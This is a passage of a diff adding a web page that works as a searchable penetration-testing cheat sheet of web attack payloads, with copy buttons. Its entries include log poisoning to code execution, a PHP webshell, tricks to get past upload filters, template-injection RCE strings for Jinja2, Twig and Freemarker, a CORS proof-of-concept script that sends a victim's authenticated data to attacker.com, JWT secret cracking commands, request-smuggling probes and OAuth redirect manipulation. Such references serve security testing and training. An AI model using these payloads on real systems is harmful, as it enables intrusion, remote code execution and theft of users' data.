+      { label: "Log poisoning to RCE", code: `# 1. Poison User-Agent:\ncurl -H "User-Agent: <?php system('id'); ?>" https://target.com/\n\n# 2. Include the log:\nhttps://target.com/?file=../../../var/log/apache2/access.log` },
+      { label: "ffuf LFI fuzzing", code: `ffuf -u "https://target.com/page?file=FUZZ" \\\n  -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \\\n  -mc 200 --filter-size 0` },
+    ],
+    notes: "<strong>Windows targets:</strong> Try ..\\\\..\\\\..\\\\windows\\\\win.ini and C:\\\\boot.ini. PHP wrappers only work on PHP backends."
+  },
+  {
+    title: "File Upload Bypass",
+    category: "File",
+    dotClass: "dot-file",
+    tags: ["File Upload", "Magic Bytes", "MIME Type", "Webshell", "PHP", "Extension Bypass", "Content-Type"],
+    desc: "Bypass file upload restrictions to upload and execute server-side code.",
+    commands: [
+      { label: "PHP webshell", code: `<?php system($_REQUEST['cmd']); ?>` },
+      { label: "Extension bypass list", code: `# Try these extensions instead of .php:\n.php5  .php7  .phtml  .phar\n.php.jpg  .php%00.jpg  .PhP` },
+      { label: "Magic bytes — prepend GIF header", code: `# File content:\nGIF89a\n<?php system($_REQUEST['cmd']); ?>` },
+      { label: "Content-Type bypass (Burp)", code: `# Change: Content-Type: application/php\n# To:     Content-Type: image/jpeg` },
+      { label: "Double extension", code: `shell.jpg.php\nshell.php.jpg  # If server processes first extension` },
+      { label: "Upload then trigger via LFI", code: `# Upload to /uploads/shell.php.gif\n# Access via LFI: ?file=../uploads/shell.php.gif` },
+    ],
+    notes: "<strong>Tip:</strong> Check if files are stored in a web-accessible directory. Use Burp to modify the request mid-upload. Test .htaccess upload to control execution."
+  },
+  {
+    title: "SSTI — Server-Side Template Injection",
+    category: "Injection",
+    dotClass: "dot-injection",
+    tags: ["SSTI", "Template Injection", "Jinja2", "Twig", "Freemarker", "RCE", "Python", "Java"],
+    desc: "Inject template expressions that are evaluated server-side, often leading to RCE.",
+    commands: [
+      { label: "Detection polyglot", code: `${{<%[%'"}}%\\.` },
+      { label: "Jinja2 (Python Flask) — RCE", code: `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` },
+      { label: "Jinja2 — class traversal RCE", code: `{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}` },
+      { label: "Twig (PHP) — RCE", code: `{{_self.env.registerUndefinedFilterCallback("exec")}}\n{{_self.env.getFilter("id")}}` },
+      { label: "Freemarker (Java) — RCE", code: `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` },
+    ],
+    notes: "<strong>Tool:</strong> Use tplmap for automated SSTI detection and exploitation: tplmap -u 'https://target.com/?name=*'"
+  },
+  {
+    title: "CORS Misconfiguration",
+    category: "Misc",
+    dotClass: "dot-misc",
+    tags: ["CORS", "Cross-Origin", "Access-Control", "Misconfiguration", "Credential Theft"],
+    desc: "Exploit overly permissive CORS policies to steal authenticated data cross-origin.",
+    commands: [
+      { label: "Test CORS reflection", code: `curl -I -H "Origin: https://evil.com" \\\n  https://target.com/api/user/data\n# Check for: Access-Control-Allow-Origin: https://evil.com` },
+      { label: "Test null origin", code: `curl -I -H "Origin: null" https://target.com/api/data` },
+      { label: "PoC exploit page", code: `<script>\nfetch('https://target.com/api/user/data', {\n  credentials: 'include'\n})\n.then(r => r.text())\n.then(d => fetch('https://attacker.com/?d='+btoa(d)));\n</script>` },
+    ],
+    notes: "<strong>Critical:</strong> CORS with Access-Control-Allow-Credentials: true + wildcard or reflected origin = account takeover."
+  },
+  {
+    title: "JWT Secret Brute Force",
+    category: "Crypto",
+    dotClass: "dot-crypto",
+    tags: ["JWT", "HS256", "Brute Force", "Weak Secret", "hashcat", "jwt_tool"],
+    desc: "Crack weak HMAC secrets used to sign JWTs, enabling token forgery.",
+    commands: [
+      { label: "hashcat JWT crack", code: `hashcat -a 0 -m 16500 <jwt_token> /usr/share/wordlists/rockyou.txt` },
+      { label: "jwt_tool dictionary attack", code: `jwt_tool <token> -C -d /usr/share/wordlists/rockyou.txt` },
+      { label: "Custom wordlist from app context", code: `# Try app name, domain, common secrets:\necho -e "secret\\nsecret123\\napp_secret\\njwt_secret" > custom.txt\njwt_tool <token> -C -d custom.txt` },
+    ],
+    notes: "<strong>After cracking:</strong> Use jwt_tool -T to forge a token with elevated claims, sign it with the cracked secret."
+  },
+  {
+    title: "HTTP Request Smuggling",
+    category: "Misc",
+    dotClass: "dot-misc",
+    tags: ["Request Smuggling", "HTTP/1.1", "CL.TE", "TE.CL", "Front-End", "Back-End", "Desync"],
+    desc: "Desynchronize front-end and back-end HTTP parsing to poison request queues.",
+    commands: [
+      { label: "CL.TE smuggling probe (Burp Repeater — disable auto update Content-Length)", code: `POST / HTTP/1.1\nHost: target.com\nTransfer-Encoding: chunked\nContent-Length: 4\n\n1\nZ\nQ` },
+      { label: "TE.CL probe", code: `POST / HTTP/1.1\nHost: target.com\nContent-Length: 3\nTransfer-Encoding: chunked\n\n8\nSMUGGLED\n0` },
+      { label: "Smuggle to access internal endpoint", code: `POST / HTTP/1.1\nHost: target.com\nTransfer-Encoding: chunked\nContent-Length: 87\n\n0\n\nGET /admin HTTP/1.1\nHost: target.com\nContent-Length: 10\n\nsmuggled` },
+    ],
+    notes: "<strong>Tool:</strong> Use the HTTP Request Smuggler extension in Burp Suite for automated detection. Always use Repeater with 'Update Content-Length' turned OFF."
+  },
+  {
+    title: "OAuth 2.0 Attacks",
+    category: "Authentication",
+    dotClass: "dot-auth",
+    tags: ["OAuth", "Authorization Code", "CSRF", "State Parameter", "Redirect URI", "Token Theft", "Open Redirect"],
+    desc: "Exploit OAuth flow weaknesses to steal authorization codes or access tokens.",
+    commands: [
+      { label: "Missing state parameter CSRF", code: `# If no state param in:\nGET /oauth/authorize?client_id=X&redirect_uri=https://app.com/callback&response_type=code\n# Force victim to initiate your auth code exchange` },
+      { label: "Redirect URI manipulation", code: `# Try:\n?redirect_uri=https://attacker.com\n?redirect_uri=https://app.com@attacker.com\n?redirect_uri=https://app.com.attacker.com\n?redirect_uri=https://app.com/../../attacker-path` },
+      { label: "Auth code interception via Referer", code: `# Find open redirect on same domain:\nhttps://app.com/redirect?url=https://attacker.com\n# Use as redirect_uri — code leaks in Referer header` },
+    ],
+    notes: "<strong>Tool:</strong> Map the full OAuth flow in Burp Suite first. Look for state parameter absence, weak redirect URI validation, and token leakage in Referer headers."
+  },
+];
+
+// Compute stats
+const allTags = new Set();
+DATA.forEach(e => e.tags.forEach(t => allTags.add(t)));
+document.getElementById('totalEntries').textContent = DATA.length;
+document.getElementById('totalTags').textContent = allTags.size;
+
+let activeFilter = 'all';
+let searchQuery = '';
+
+function renderEntries() {
+  const list = document.getElementById('entriesList');
+  const q = searchQuery.toLowerCase().trim();
+  
+  let filtered = DATA.filter(entry => {
+    const matchFilter = activeFilter === 'all' || entry.category === activeFilter || entry.tags.some(t => t.toLowerCase().includes(activeFilter.toLowerCase()));
+    if (!matchFilter) return false;
+    if (!q) return true;
+    return entry.title.toLowerCase().includes(q) ||
+      entry.tags.some(t => t.toLowerCase().includes(q)) ||
+      entry.category.toLowerCase().includes(q) ||
+      entry.desc.toLowerCase().includes(q);
+  });
+
+  document.getElementById('noResults').style.display = filtered.length === 0 ? 'block' : 'none';
+  document.getElementById('noResultsQuery').textContent = q;
+  document.getElementById('resultCount').innerHTML = q || activeFilter !== 'all'
+    ? `Showing <em>${filtered.length}</em> of ${DATA.length} techniques`
+    : `<em>${DATA.length}</em> techniques`;
+
+  list.innerHTML = filtered.map((entry, idx) => `
+    <div class="entry" data-idx="${DATA.indexOf(entry)}" tabindex="0">
+      <div class="entry-title-cell">
+        <span class="cat-dot ${entry.dotClass}"></span>
+        ${entry.title}
+      </div>
+      <div class="entry-tags-cell">
+        ${entry.tags.map(t => `<span class="tag ${q && t.toLowerCase().includes(q) ? 'highlight' : ''}" data-tag="${t}">${t}</span>`).join('')}
+      </div>
+    </div>
+  `).join('');
+
+  // Click handlers
+  list.querySelectorAll('.entry').forEach(el => {
+    el.addEventListener('click', e => {
+      if (e.target.classList.contains('tag')) {
+        document.getElementById('searchInput').value = e.target.dataset.tag;
+        searchQuery = e.target.dataset.tag;
+        renderEntries();
+        return;
+      }
+      openModal(parseInt(el.dataset.idx));
+    });
+    el.addEventListener('keydown', e => {
+      if (e.key === 'Enter') openModal(parseInt(el.dataset.idx));
+    });
+  });
+}
+
+function openModal(idx) {
+  const entry = DATA[idx];
+  document.getElementById('modalTitle').textContent = entry.title;
+  document.getElementById('modalBody').innerHTML = `
+    <div class="modal-tags">${entry.tags.map(t => `<span class="tag">${t}</span>`).join('')}</div>
+    <div class="modal-desc">${entry.desc}</div>
+    ${entry.commands.map((cmd, i) => `
+      <div class="cmd-block">
+        <div class="cmd-label">${cmd.label}</div>
+        <div class="cmd-code" id="cmd-${idx}-${i}"><button class="copy-btn" data-target="cmd-${idx}-${i}">copy</button>${escapeHtml(cmd.code)}</div>
+      </div>
+    `).join('')}
+    ${entry.notes ? `<div class="notes-block">${entry.notes}</div>` : ''}
+  `;
+  document.getElementById('modalOverlay').classList.add('open');
+  document.body.style.overflow = 'hidden';
+
+  // Copy buttons
+  document.querySelectorAll('.copy-btn').forEach(btn => {
+    btn.addEventListener('click', e => {
+      e.stopPropagation();
+      const pre = document.getElementById(btn.dataset.target);
+      const text = pre.innerText.replace('copy', '').trim();
+      navigator.clipboard.writeText(text).then(() => {
+        btn.textContent = 'copied!';
+        btn.classList.add('copied');
+        setTimeout(() => { btn.textContent = 'copy'; btn.classList.remove('copied'); }, 1800);
+      });
+    });
+  });
+}
+
+function escapeHtml(str) {
+  return str.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+
+document.getElementById('modalClose').addEventListener('click', closeModal);
+document.getElementById('modalOverlay').addEventListener('click', e => {
+  if (e.target === document.getElementById('modalOverlay')) closeModal();
+});
+
+function closeModal() {
+  document.getElementById('modalOverlay').classList.remove('open');
+  document.body.style.overflow = '';
+}
+
+document.addEventListener('keydown', e => {
+  if (e.key === 'Escape') closeModal();
+  if ((e.ctrlKey || e.metaKey) && e.key === 'k') {
+    e.preventDefault();
+    document.getElementById('searchInput').focus();
+  }
+});
+
+document.getElementById('searchInput').addEventListener('input', e => {
+  searchQuery = e.target.value;
+  renderEntries();
+});
+
+document.querySelectorAll('.filter-pill').forEach(pill => {
+  pill.addEventListener('click', () => {
+    document.querySelectorAll('.filter-pill').forEach(p => p.classList.remove('active'));
+    pill.classList.add('active');
+    activeFilter = pill.dataset.cat;
+    renderEntries();
+  });
+});
+
+// Keyboard shortcut hint
+document.getElementById('searchHint').textContent = '⌃K';
+
+renderEntries();
+</script>
+</body>
+</html>
